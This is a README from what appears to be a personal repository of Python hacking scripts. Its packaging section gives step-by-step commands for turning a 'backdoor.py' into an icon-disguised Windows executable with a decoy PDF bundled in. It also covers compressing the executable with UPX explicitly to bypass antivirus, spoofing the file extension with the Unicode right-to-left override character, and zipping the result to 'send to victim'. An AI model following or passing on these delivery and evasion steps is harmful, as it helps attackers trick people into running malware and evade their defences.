# Python Scripts
A Collection of Python Scripts.

## Packaging

### Common
- Search pdf in [IconFinder](https://www.iconfinder.com/) to create an icon (Free, 512\*512, .ico)
- To bypass AntiVirus, use [UPX](https://github.com/upx/upx/releases) to compress exe file: ```./upx /root/PycharmProjects/backdoor/dist/backdoor.exe -o compressed_bacdoor.exe```
- Change the file extension:
  - Install Characters 3.34.0: ```apt install gnome-characters```
  - Search for 'Right-to-left Override' in 'Characters' tool in Kali
  - Select 'Copy Character' to copy 'Unicode U+202E' to clipboard
  - Open notepad and write 'al\*fdp.exe' then paste in the place of star
  - Rename the file to 'alexe.pdf'
- Zip the pdf file to hide the exe extension and send to victim

### Windows
- Install pyinstaller for python: ```python.exe -m pip install pyinstaller```
- Convert to exe: ```pyinstaller.exe backdoor.py --onefile --noconsole --add-data "/root/Downloads/sample.pdf;." --icon /root/Downlaods/pdf.ico```

### Linux
- Install python for Windows inside Linux: ```wine msiexec /i python-2.7.14.msi```
- Install pyinstaller for python: ```wine /root/.wine/drive_c/Python27/python.exe -m pip install pyinstaller```
- Install all imported library: ```wine /root/.wine/drive_c/Python27/python.exe -m pip install pynput```
- Convert to exe: ```wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe backdoor.py --onefile --noconsole --add-data "/root/Downloads/sample.pdf;." --icon /root/Downlaods/pdf.ico```
